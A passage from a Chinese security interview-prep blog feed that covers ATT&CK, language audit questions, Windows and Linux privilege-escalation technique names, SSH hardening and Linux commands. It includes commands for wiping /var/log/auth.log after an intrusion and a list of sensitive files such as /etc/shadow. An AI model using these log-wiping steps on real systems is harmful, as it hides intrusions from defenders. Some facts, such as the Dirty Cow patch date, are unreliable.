ATT＆CK时，大多数安全团队都倾向于为Enterprise矩阵中的每种技术尝试开发某种检测或预防控制措施。虽然这并不是一个坏主意，但是ATT＆CK矩阵中的技术通常可以通过多种方式执行。因此，阻止或检测执行这些技术的一种方法并不一定意味着涵盖了执行该技术的所有可能方法。由于某种工具阻止了用另一种形式来采用这种技术，而组织机构已经适当地采用了这种技术，这可能导致产生一种虚假的安全感。但是，攻击者仍然可以成功地采用其他方式来采用该技术，但防御者却没有任何检测或预防措施。<br>（5）SOC成熟度评估<br>ATT＆CK可用作一种度量，确定SOC在检测、分析和响应入侵方面的有效性。SOC团队可以参考ATT＆CK已检测到或未涵盖的技术和战术。这有助于了解防御优势和劣势在哪里，并验证缓解和检测控制措施，并可以发现配置错误和其他操作问题。<br>（6）网络威胁情报收集<br>ATT＆CK对于网络威胁情报很有用，因为ATT＆CK是在用一种标准方式描述对抗行为。可以根据攻击者已知利用的ATT＆CK中的技术和战术来跟踪攻击主体。这为防御者提供了一个路线图，让他们可以对照他们的操作控制措施，查看对某些攻击主体而言，他们在哪些方面有弱点，在哪些方面有优势。针对特定的攻击主体，创建MITRE ATT＆CK 导航工具内容，是一种观察环境中对这些攻击主体或团体的优势和劣势的好方法。ATT＆CK还可以为STIX 和 TAXII 2.0提供内容，从而可以很容易地将支持这些技术的现有工具纳入中。<br><a href="https://www.anquanke.com/post/id/187998">ATT&amp;CK框架以及使用场景实例</a></p><p>ATT&amp;CK工具：<br>1、Metta<br>Metta是一款对抗性模拟工具，它是由多个内部项目产生的。Metta使用Redis&#x2F;Celery、python和VirtualBox进行攻击行为模拟，这样用户就可以测试基于主机的安全系统。另外用户还能测试其他基于网络的安全检测和控制，具体过程取决于使用者的设置方式。Metta能够在Microsoft Windows、MacOS和Linux等多个操作系统终端上运行。<br>2、Atomic Red Team<br>Atomic Red Team是一个由Red Canary主导的开源项目，它提供了和ATT&amp;CK一致的红队测试内容，可以用来测试现有的威胁分析方法。安全团队可以使用Atomic Red Team快速、可移植和可重复地测试他们的系统应用环境。用户可以直接通过命令行执行测试，无需安装运行软件。<br>3、Mapping CVEs to MITRE ATT&amp;CK网站<br>这是一个由Vulcan Cyber的研究团队创建的网站，用于展示一个正在进行的攻击研究项目，可以将记录的CVE映射到MITRE ATT&amp;CK矩阵中的相关战术和技术。目前，该网站还处于测试阶段，将会不断更新，以纳入并记录更多的新CVE。用户可以根据特定的技术需要搜索CVE，也可以通过特定的CVE搜索与之匹配的ATT&amp;CK战术和技术。</p><h1 id="对于笔试面试会有的问题做个频率标记：有可能会问到的或自认为比较重要的就在问题前做个记号“-”"><a href="#对于笔试面试会有的问题做个频率标记：有可能会问到的或自认为比较重要的就在问题前做个记号“-”" class="headerlink" title="对于笔试面试会有的问题做个频率标记：有可能会问到的或自认为比较重要的就在问题前做个记号“@”"></a>对于笔试面试会有的问题做个频率标记：有可能会问到的或自认为比较重要的就在问题前做个记号“@”</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;地基。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="计算机基础" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之语言篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E8%AF%AD%E8%A8%80%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-09-04T02:54:09.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言基础是地基。</p><span id="more"></span><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li><p>php.ini可以设置哪些安全特性？</p></li><li><p>php的%00截断原理是什么？</p></li><li><p>php中命令执行涉及到的函数</p></li><li><p>代码执行、文件读取、命令执行的函数都有哪些？</p></li><li><p>PHP审计流程</p></li><li><p>vender目录</p></li><li><p>phpunit</p></li><li><p>php可以构造无文件shell吗？</p></li><li><p>PHP常见漏洞对应函数（命令执行，代码执行，文件包含，文件上传，文件删除，SSRF）</p></li><li><p>PHP的安全特性有关注吗？</p></li><li><p>代码审计（mvc&#x2F;非mvc）</p></li><li><p>简述PHP中造成任意文件下载漏洞的常见函数，以及造成漏洞的原因。</p></li><li><p>PHP作为弱类型语言，在底层它是怎么判断变量的类型的？</p></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><ol><li><p>img标签除了onerror属性外，还有其它获取管理员路径的办法吗？</p></li><li><p>img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径？</p></li></ol><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><ol><li><p>命令的函数&#x2F;包</p></li><li><p>Java审计流程，一般关注哪些洞，或擅长挖哪些类型？</p></li><li><p>tomcat做回显</p></li><li><p>内存马的实现</p></li><li><p>Java执行命令的几种方式</p></li><li><p>反射，代理，类加载这些熟悉吗</p></li><li><p>代码审计</p></li><li></li></ol><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><ol><li><p>是否写过非脚本工具</p></li><li><p>代码审计</p></li><li><p>写出任意一种漏洞检测代码，用python实现</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;语言基础是地基。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="语言" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之系统篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-31T10:13:51.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>了解系统，才能更好攻击与防御。</p><span id="more"></span><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><ol><li>CMD命令行如何查询远程终端开放的端口。</li></ol><p><code>netstat -an</code></p><ol start="2"><li>@ Windows认证协议</li></ol><p>NTLM, NTLM（NT LAN Manager）是Windows早期版本中使用的认证协议。NTLM使用挑战&#x2F;响应机制来验证用户身份。客户端和服务器之间的通信需要多次交换数据以进行身份验证。容易受到中间人攻击的威胁。<br>Kerberos, Kerberos是Windows Server 2000中引入的认证协议。Kerberos使用票据交换来进行身份验证，客户端和服务器之间的通信只需要一次票据交换，因此减少了中间人攻击的机会。<br>NTLMv2, NTLMv2是NTLM的改进版本。NTLMv2使用更安全的哈希算法来保护用户密码。<br>Negotiate, Negotiate是Windows Server 2003中引入的认证协议。Negotiate允许客户端和服务器协商使用哪种认证协议。(是协议选择机制，Kerberos或NTLM)</p><p>安全性：Kerberos&gt;NTLM</p><ol start="3"><li>@ Windows怎么提权</li></ol><p>(1) 内核溢出提权–未打漏洞补丁，可以通过metasploit信息收集，手工信息收集systeminfo等。</p><p>(2) 系统配置错误提权<br>2.1 权限配置错误<br>2.2 可信任服务器路径漏洞<br>2.3 不安全的注册表权限配置<br>2.4 启用注册表键AlwaysInstallElevated</p><p>(3) 组策略首选项提权</p><p>(4) bypass UAC(User Account Control 用户账户控制)提权</p><p>(5) 令牌窃取</p><p>(6) 数据库提权</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ol><li>Linux服务器的安全运维操作有哪些？如何保护SSH？</li></ol><p>Linux安全运维：<br>(1) 删除特殊的用户和用户组：默认安装很多不必要的用户和用户组，不需要即删除。可删的如adm、lp、sync、shutdown、halt<br>(2) 关闭系统不需要的服务：默认绑定很多没用的服务是自启动，根据服务器用途不需要即删除。一般可删的如：auditd, ip6tables kdump<br>(3) 合理使用su、sudo命令：sudo执行命令的流程是：将当前用户切换到超级用户下，或切换到指定的用户下，然后以超级用户或其指定切换到的用户身份执行命令，执行完成后，直接退回到当前用户，而这一切的完成要通过sudo的配置文件&#x2F;etc&#x2F;sudoers来进行授权。<br>(4) 删减系统登录欢迎信息：虽然欢迎信息或版本信息能给系统管理者带来一定的方便，但是这些信息可能被利用，为了保证系统安全，可以修改或删除某些系统文件，这样的文件有: <code>/etc/issue  /etc/issue.net  /etc/redhat-release  /etc/motd</code><br>(5) 禁止Control-Alt-Delete键盘关闭命令：默认同时按下Control-Alt-Delete组合键，系统将自动重启，这个策略不安全，因此禁止。<br>(6) 合理使用shell历史命令记录功能：linux下可通过history命令查看用户所有的历史操作记录，同时shell命令操作记录默认保存在用户目录下的.bash_history文件中，通过这个文件可以查询shell命令的执行历史，有助于运维人员进行系统审计和问题排查<br>(7) 启动tcp_wrappers防火墙：tcp_wrappers是一个用来分析TCP&#x2F;IP封包的软件，类似的IP封包软件还有iptables。</p><p>保护SSH：<br>(1) 改变默认端口<br>(2) 不要使用密码，通过密钥连接<br>(3) 决定谁可以登录，连接IP限制<br>(4) 禁用root用户登录<br>(5) 限制登录访问尝试<br>(6) 使用SSH 版本2</p><ol start="2"><li>入侵Linux服务器后需要清除哪些日志？</li></ol><p>删除bash历史记录<br>需要清理的日志记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log  认证</span><br><span class="line">/var/log/cron.log  Cron任务</span><br><span class="line">/var/log/maillog   邮件</span><br><span class="line">/var/log/httpd    Apache</span><br></pre></td></tr></table></figure><p>注意：清理方式是将文件清空，而不是将其完全擦除。<br>使用truncate命令将文件大小减少到0： <code>truncate -s 0 /var/log/auth.log</code><br>通过将nothing映射到文件来完成： <code>echo &#39;&#39; &gt; /var/log/auth.log</code><br>还可以单独使用&gt;来清理文件： <code>&gt; /var/log/auth.log</code><br>也可以发送到&#x2F;dev&#x2F;null： <code>cat /dev/null &gt; /var/log/auth.log</code><br>使用tee命令： <code>true | tee /var/log/auth.log</code></p><ol start="3"><li>@ Linux提权的姿势</li></ol><p>(1) 内核漏洞提权–DirtyCow<br>(2) 定时任务提权<br>(3) SUID提权<br>(4) Sudo滥用提权<br>(5) 外壳逃生序列<br>(6) NFS提权<br>(7) Password &amp; Key 提权<br>(8) Docker提权</p><ol start="4"><li>Linux下有哪些文件进行渗透时比较关注的，以及文件权限问题</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php/php.ini</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43847838/article/details/127886311">Linux渗透中常见的敏感目录或文件</a></p><p>文件权限：<br>chown (change owner) ： 修改所属用户与组。<br>chmod (change mode) ： 修改用户的权限。<br>使用 ll 或者 ls –l 命令来显示一个文件的属性以及文件所属的用户和组<br>r-4 代表可读(read)、 w-2 代表可写(write)、 x-1 代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号 - 而已。<br><img src="/simg/system_1.jpg" alt=" "></p><ol start="5"><li>dirty cow的时间及其修复版本（哪年后无法使用）</li></ol><p>自2007 年9 月发布的2.6.22 版本起就存在于Linux 内核中<br>2017 年 11 月 27 日发布了补丁来修复该问题。</p><ol start="6"><li>列举Linux反弹shell的一些方法</li></ol><p>(1) 利用netcat反弹shell<br>(2) 利用bash反弹shell<br>(3) Curl配合bash反弹shell(最近curl爆出漏洞)<br>(4) 将反弹shell的命令写入&#x2F;etc&#x2F;profile文件<br>(5) 利用Socat反弹shell<br>(6) 利用Telnet反弹shell<br>(7) 利用awk反弹shell<br>(8) 各种脚本反弹shell</p><ol start="7"><li>Linux系统中etc&#x2F;password和&#x2F;shadow文件的区别</li></ol><p><code>/etc/passwd</code> 存储一般的用户信息，任何人都可以访问。<br>存储格式: <code>用户名:口令:用户标识号:组标识号:注释:主目录:登录Shell</code><br><code>/etc/shadow</code> 存储用户的密码信息，只有 root 用户可以访问<br>存储格式: <code>用户名:密码散列:最后修改日期:密码最短有效期:密码最长有效期:密码过期警告期限:密码失效日期:帐户失效日期:保留字段</code><br><a href="https://howiezhao.github.io/2018/04/29/passwd-and-shadow/">Linux 中&#x2F;etc&#x2F;passwd 与&#x2F;etc&#x2F;shadow 的区别</a></p><ol start="8"><li>Linux如何查看当前权限</li></ol><p>查看当前用户: <code>whoami</code><br>查看登录用户: <code>who</code><br>查看有哪些用户组: <code>cat /etc/group</code><br>查看当前用户在哪个组: <code>groups</code></p><ol start="9"><li>对Linux了解吗？Linux内核漏洞有没有分析过？</li></ol><p>有一定程度的了解。</p><p>经典的Dirty Cow。漏洞形成原因：写时拷贝技术</p><p>和新内核漏洞的利用方法：<br>(1) pipe管道技术<br>(2) kernel5.x版本和kernal4.x版本的利用方法</p><p>Linux内核保护与绕过<br>(1) KASLR保护<br>(2) SMEP&amp;SMAP保护<br>(3) KPTI保护</p><p><a href="https://paper.seebug.org/2050/">Linux 内核常用保护和绕过技术</a></p><ol start="10"><li>你说你对堆栈溢出有了解，那玩过pwn吗？</li></ol><p>无</p><ol start="11"><li>如果对方开启了ASLR和DEP，要如何绕过？</li></ol><p>先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和 <code>/bin/sh</code> 字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br><a href="https://zhuanlan.zhihu.com/p/23487280">一步一步学ROP之linux_x86篇</a></p><ol start="12"><li>Linux命令</li></ol><p>(1) cat - 用于连接文件并打印到标准输出设备上。<br>实例：<br><code>cat -n textfile1 &gt; textfile2</code>  把textfile1的文档内容加上行号后输入textfile2这个文档里<br><code>cat /dev/null &gt; /etc/test.txt</code>  清空 <code>/etc/test.txt</code> 文档内容<br><code>dev/null</code> ：在类 Unix 系统中， <code>/dev/null</code> 称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个 EOF。</p><p>(2) chmod - 控制用户对文件的权限的命令<br>Linux&#x2F;Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。<br>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。<br>u&#x3D;user(文件所有者), g&#x3D;group(文件所有者所在组), o&#x3D;others(所有其它用户), a&#x3D;all(所有用户，相当于ugo)<br><code>+</code> 为指定用户类型增加权限，<code>-</code> 去除指定用户类型的权限，<code>=</code> 设置指定用户权限的设置，也即把用户类型的所有权限重置<br>4&#x3D;r(读), 2&#x3D;w(写), 1&#x3D;x(执行)<br>实例：<br><code>chmod ugo+r file1.txt</code> 将文件file1.txt设为所有人皆可读取<br><code>chmod a+r file1.txt</code> 将文件file1.txt设为所有人皆可读取<br><code>chmod u+x ex1.py</code> 将文件ex1.py文件拥有者增加可执行权限<br><code>chmod 777 file</code> 将文件file设置为所有人皆可读可写可执行</p><p>(3) chown - 用于设置文件所有者和文件关联组的命令<br>chown 需要超级用户 root 的权限才能执行此命令。<br>实例：<br><code>chown root /var/run/httpd.pid</code>  把 <code>/var/run/httpd.pid</code> 的所有者设置root<br><code>chown runoob:runoobgroup file1.txt</code> 将文件file1.txt的拥有者设置为runoob，群体的使用者runoobgroup<br><code>chown runoob:runoobgroup *</code> 将当前前目录下的所有文件和子目录的拥有者皆设为runoob，群体使用者runoobgroup<br><code>chown :512 /home/runoob</code> 把&#x2F;home&#x2F;runoob的关联组设置为512（关联组id），不改变所有者</p><p>(4) chgrp - 用于变更文件或目录的所属群组<br>与 chown 命令不同，chgrp 允许普通用户改变文件所属的组，只要该用户是该组的一员。<br>实例：<br><code>chgrp -v bin log2012.log</code> log2012.log的所属组从root更改为bin<br><code>chgrp --reference=log2012.log log2013.log</code> 根据指定文件改变文件的群组属性。这里将log2013.log文件的群组属性改为和log2012.log相同</p><p>(5) cmp - 用于比较两个文件是否有差异<br>当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有差异，预设会标示出第一个不同之处的字符和列数编号。<br>若不指定任何文件名称或是所给予的名称为“-”，则cmp指令会从标准输入设备读取数据。<br>实例：<br><code>cmp prog.o.bak prag.o</code><br>这比较prog.o.bak和prog.o。如果文件相同，则不显示消息。如果文件不同，则显示第一个不同的位置，如：<br><code>prog.o.bak prog.o differ: char 4, line 1</code></p><p>(6) diff - 用于比较文件的差异。<br>diff以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则diff会比较目录中相同文件名的文件，但不会比较其中子目录。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff log2014.log log2013.log  // 比较两个文件</span><br><span class="line">3c3</span><br><span class="line">&lt; 2014-03</span><br><span class="line">---</span><br><span class="line">&gt; 2013-03</span><br><span class="line">8c8</span><br><span class="line">&lt; 2013-07</span><br><span class="line">---</span><br><span class="line">&gt; 2013-08</span><br><span class="line">11,12d10</span><br><span class="line">&lt; 2013-11</span><br><span class="line">&lt; 2013-12</span><br><span class="line"></span><br><span class="line">上面的&quot;3c3&quot;和&quot;8c8&quot;表示log2014.log和log20143log文件在3行和第8行内容有所不同；</span><br><span class="line">&quot;11,12d10&quot;表示第一个文件比第二个文件多了第11和12行。</span><br><span class="line">&quot;&lt;&quot;表示后面文件比前面文件少了1行内容，&quot;&gt;&quot;表示后面文件比前面文件多了1行内容</span><br></pre></td></tr></table></figure><p>(7) file - 用于辨识文件类型<br>通过file指令，我们得以辨识该文件的类型<br>实例：<br>显示文件类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# file install.log</span><br><span class="line">install.log: UTF-8 Unicode text</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -b install.log      &lt;== 不显示文件名称</span><br><span class="line">UTF-8 Unicode text</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -i install.log      &lt;== 显示MIME类别。</span><br><span class="line">install.log: text/plain; charset=utf-8</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -b -i install.log</span><br><span class="line">text/plain; charset=utf-8</span><br></pre></td></tr></table></figure><p>显示符号链接文件类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ls -l /var/mail</span><br><span class="line">lrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -&gt; spool/mail</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file /var/mail</span><br><span class="line">/var/mail: symbolic link to `spool/mail&#x27;</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -L /var/mail</span><br><span class="line">/var/mail: directory</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file /var/spool/mail</span><br><span class="line">/var/spool/mail: directory</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# file -L /var/spool/mail</span><br><span class="line">/var/spool/mail: directory</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(8) find - 用于在指定目录下查找文件和目录<br>它可以使用不同的选项来过滤和限制查找结果<br>实例：<br><code>find . -name file.txt</code> 查找当前目录下名为file.txt的文件<br><code>find . -name &quot;*.c&quot;</code> 将当前目录及其子目录下所有文件后缀为 <code>.c</code> 的文件列出来<br><code>find . -type f</code> 将当前目录及其子目录的所有文件列出<br><code>find /home -size +1M</code> 查找&#x2F;home目录下大于1MB的文件<br><code>find /var/log mtime +7</code> 查找&#x2F;var&#x2F;log目录下在7天前修改过的文件<br><code>find . -ctime 20</code> 将当前目录及其子目录下所有最近20天前更新过的文件列出，不多不少正好20天前的<br><code>find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;</code> 查找&#x2F;var&#x2F;log目录中更改时间在7日以前的普通文件，且在删除之前询问它们<br><code>find . -type f -perm 644 -exec ls -l &#123;&#125; \;</code> 查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件<br><code>find / -type f -size 0 -exec ls -l &#123;&#125; \;</code> 查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径</p><p>(9) git - 是文字模式下的文件管理员<br>git是用来管理文件的程序，它十分类似DOS下的Norton Commander，具有互动式操作界面。它的操作方式和Norton Commander几乎一样。<br>F1 ：执行info指令，查询指令相关信息，会要求您输入欲查询的名称。<br>F2 ：执行cat指令，列出文件内容。<br>F3 ：执行gitview指令，观看文件内容。<br>F4 ：执行vi指令，编辑文件内容。<br>F5 ：执行cp指令，复制文件或目录，会要求您输入目标文件或目录。<br>F6 ：执行mv指令，移动文件或目录，或是更改其名称，会要求您输入目标文件或目录。<br>F7 ：执行mkdir指令，建立目录。<br>F8 ：执行rm指令，删除文件或目录。<br>F9 ：执行make指令，批处理执行指令或编译程序时，会要求您输入相关命令。<br>F10 ：离开git文件管理员。</p><p>(10) cut - 用于显示每行从开头算起num1到num2的文字<br>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cut  [-bn] [file]</span><br><span class="line">cut [-c] [file]</span><br><span class="line">cut [-df] [file]</span><br></pre></td></tr></table></figure><p>使用说明：<br>cut命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。<br>如果不指定File参数，cut命令将读取标准输入。必须指定 -b、-c或-f标志之一。<br>参数：<br>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。<br>-c ：以字符为单位进行分割。<br>-d ：自定义分隔符，默认为制表符。<br>-f ：与-d一起使用，指定显示哪个区域。<br>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</p><p>(11) ln - 功能是为某一个文件在另外一个位置建立一个同步的链接<br>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。<br>不论是硬链接或软链接都不会将原本的档案复制一份，只会占用非常少量的磁碟空间。<br>实例：<br><code>ln -s log2013.log link2013</code> 给文件创建软链接，为log2013.log文件创建软链接link2013，如果log2013.log丢失，link2013将失效<br><code>ln log2013.log ln2013</code> 给文件创建硬链接，为log2013.log创建硬链接ln2013，log2013.log与ln2013的各项属性相同</p><p>(12) more - 类似cat，不过会一页一页的形式显示，更方便使用者逐页阅读<br>而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h<br>实例：<br><code>more -s testfile</code> 逐页显示testfile文档内容，如有连续两行以上空白则以一行空白显示<br><code>more +20 testfile</code> 从第20行开始显示testfile的文档内容<br>常用操作命令：<br>Enter 向下n行，需要定义。默认为1行<br>Ctrl+F 向下滚动一屏<br>空格键 向下滚动一屏<br>Ctrl+B 返回上一屏<br>&#x3D; 输出当前行的行号<br>：f 输出文件名和当前行的行号<br>V 调用vi编辑器<br>!命令 调用Shell，并执行命令<br>q 退出more</p><p>(13) less - less与more相似，less可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。<br>实例：<br><code>less log2013.log</code> 查看文件<br><code>ps -ef |less</code> ps查看进程信息并通过less分页表示<br><code>history |less</code> 查看历史记录并通过less分页表示<br><code>less log2013.log log2014.log</code> 浏览多个文件<br>说明：<br>输入 ：n后，切换到 log2014.log<br>输入 ：p 后，切换到log2013.log<br>附加备注：<br>1、全屏导航<br>ctrl + F - 向前移动一屏<br>ctrl + B - 向后移动一屏<br>ctrl + D - 向前移动半屏<br>ctrl + U - 向后移动半屏<br>2、单行导航<br>j - 下一行<br>k - 上一行<br>3、其它导航<br>G - 移动到最后一行<br>g - 移动到第一行<br>q &#x2F; ZZ - 退出 less 命令<br>4、其它有用的命令<br>v - 使用配置的编辑器编辑当前文件<br>h - 显示 less 的帮助文档<br>&amp;pattern - 仅显示匹配模式的行，而不是整个文件<br>5、标记导航<br>当使用 less 查看大文件时，可以在任何一个位置作标记，可以通过命令导航到标有特定标记的文本位置：<br>ma - 使用 a 标记文本的当前位置<br>‘a - 导航到标记 a 处</p><p>(14) lsattr - 用于显示文件属性<br>用chatter执行改变文件或目录的属性，可执行lsattr指令查询其属性<br>实例：<br><code>lsattr /etc/resolv.conf</code> 使用lsattr命令来显示文件属性<br>输出结果为: <code>----i-------- /etc/resolv.conf</code></p><p>(15) mv - 用来为文件或目录改名，或将文件或目录移入其它位置<br>实例：<br><code>mv aaa bbb</code> 将文件aaa改名为bbb<br><code>mv info/ logs</code> 将info目录放入logs目录中。注意，如果logs目录不存在，则该命令将info改名为logs<br><code>mv /usr/runoob/*  .</code> 将&#x2F;usr&#x2F;runoob下的所有文件和目录移到当前目录下<br><code>mv source_file dest_directory</code> 将文件source_file移动到目标目录dest_directory中</p><p>(16) paste - 用于合并文件的列<br>paste命令会把每个文件以列对列的方式，一列列地加以合并。<br>实例：<br><code>paste file testfile testfile1</code> 使用paste指令将文件file, testfile, testfile1进行合并</p><p>(17) patch - 用于修补文件<br>patch指令让用户利用设置修补文件的方式，修改，更新原始文件。倘若一次仅修改一个文件，可直接在指令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。<br>实例：<br><code>patch -p0 testfile1 testfile.patch</code> 使用patch指令将文件”testfile1”升级，其升级补丁文件为”testfile.patch”</p><p>(18) rm - 用于删除一个文件或目录<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm test.txt</span><br><span class="line">rm：是否删除 一般文件 &quot;test.txt&quot;? y</span><br><span class="line">rm  homework  </span><br><span class="line">rm: 无法删除目录&quot;homework&quot;: 是一个目录</span><br><span class="line">rm  -r  homework  </span><br><span class="line">rm：是否删除 目录 &quot;homework&quot;? y</span><br><span class="line"></span><br><span class="line">rm -r *  // 删除当前目录下的所有文件及目录</span><br><span class="line">rm -rf test/  // 删除目录 